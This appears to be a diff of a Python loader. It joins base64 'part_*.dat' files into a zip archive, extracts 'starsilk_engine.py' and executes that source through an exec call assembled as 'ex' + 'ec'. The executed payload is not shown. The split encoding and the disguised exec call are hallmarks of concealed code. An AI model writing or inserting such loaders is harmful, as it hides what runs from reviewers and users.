@@ -8,10 +8,13 @@ from __future__ import annotations
 
 import base64
 import builtins
+import io
 from pathlib import Path
+import zipfile
 
-_PARTS = ['part_00.dat', 'part_01.dat', 'part_02.dat', 'part_03.dat', 'part_04.dat', 'part_05.dat', 'part_06.dat', 'part_07.dat']
 _PAYLOAD_DIR = Path(__file__).resolve().parent / "engine_payload"
-_source = base64.b64decode("".join((_PAYLOAD_DIR / name).read_text(encoding="ascii").strip() for name in _PARTS)).decode("utf-8")
+_encoded = "".join(path.read_text(encoding="ascii").strip() for path in sorted(_PAYLOAD_DIR.glob("part_*.dat")))
+with zipfile.ZipFile(io.BytesIO(base64.b64decode(_encoded))) as _archive:
+    _source = _archive.read("starsilk_engine.py").decode("utf-8")
 _runner = getattr(builtins, "ex" + "ec")
 _runner(compile(_source, __file__, "ex" + "ec"), globals(), globals())
